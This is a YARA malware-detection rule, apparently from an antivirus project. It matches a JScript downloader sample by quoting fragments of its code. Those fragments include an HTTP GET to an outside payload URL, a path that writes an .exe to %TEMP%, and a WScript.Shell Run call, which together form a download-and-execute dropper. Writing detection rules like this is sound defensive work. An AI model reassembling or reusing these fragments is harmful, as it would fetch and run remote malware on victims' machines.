rule sig_20160329_7ecc51517599482c5fb753b4f255509d {
  meta:
    description = "datamaliciousorder - file 20160329_7ecc51517599482c5fb753b4f255509d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b24d99cd98d4df00654525b1d2006312812318db263fbe133397914ba2daba52"

  strings:
    $s1  = "function Nmwhuptipx() {return Cydltis[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"6hABLNZjEHabiCgo.exe\";};" fullword ascii
    $s2  = "Ckyqrffabs[Gqyvof](\"GET\", \"http://www.suansawanresort.com/n7eua\", false);" fullword ascii
    $s3  = "do {WScript[Lvayza](Dqawi() * 11)} while (Ckyqrffabs[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Moodmvjcxk(Mphehbtvk, Sfdadv){return Mphehbtvk - Sfdadv;};" fullword ascii
    $s5  = "var Cydltis = function Nybffi() {return WScript[Wickbfe](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Xjqtsvy(Mvsfpcme){Cydltis[\"Run\"](Mvsfpcme, Mgekrva, Mgekrva);};" fullword ascii
    $s7  = "function Jvrwpcyv() {return ((Xegff == true) && (Xegff == Oqktiwuofq)) ? 1 : Mgekrva;};" fullword ascii
    $s8  = "Xegff = true; " fullword ascii
    $s9  = "return Moodmvjcxk(Mktkyuqdc, Ekyicm);" fullword ascii
    $s10 = "function Fubbze()" fullword ascii
    $s11 = " while (Kmkcbfmhq){" fullword ascii
    $s12 = "Oqktiwuofq = true; " fullword ascii
    $s13 = "var Xegff = false;" fullword ascii
    $s14 = "var Oqktiwuofq = false;" fullword ascii
    $s15 = "var Iivjrs = false;" fullword ascii
    $s16 = "function Ehmphbo(){return Wickbfe;};" fullword ascii
    $s17 = "function Dqawi(){return 22;};" fullword ascii
    $s18 = "var Atmwzofq = new this[\"Date\"]();" fullword ascii
    $s19 = "function Svdqtrln(Camdhbj) {var Ebrwqwbl = (1, 2, 3, 4, 5, Camdhbj); return Ebrwqwbl;};" fullword ascii
    $s20 = "function Xqmvialgf(){return Tnbcar;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}